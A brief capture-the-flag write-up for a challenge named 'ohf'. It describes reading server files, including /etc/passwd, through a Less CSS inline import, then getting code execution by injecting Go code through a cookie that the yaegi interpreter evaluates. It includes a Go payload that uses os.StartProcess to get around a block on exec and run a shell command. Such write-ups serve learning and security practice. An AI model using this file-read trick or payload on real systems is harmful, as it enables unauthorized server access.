# ohf

Interesting challenge:
- [lesscs](https://lesscss.org/) is used to evaluate CSS on the backend. Can read arbitrary files with `@import (inline) "/etc/passwd";`
- Leak source code
- Uses [interp](https://github.com/traefik/yaegi) to evaluate golang at runtime from cookie
- Control `Version` in cookie, get arbitrary code execution
- Realize `os.exec` is blocked, use `os.StartProcess` instead
```
	import "io/ioutil"
    import "os"
	func api() string {
		v, _ := ioutil.ReadFile("satellite.txt")
        var procAttr os.ProcAttr
        procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
        p, _ := os.StartProcess("/bin/sh", []string{"/bin/sh", "-c", "/readflag > /tmp/jizz"}, &procAttr)
        p.Wait()
		return string(v)
	}
```
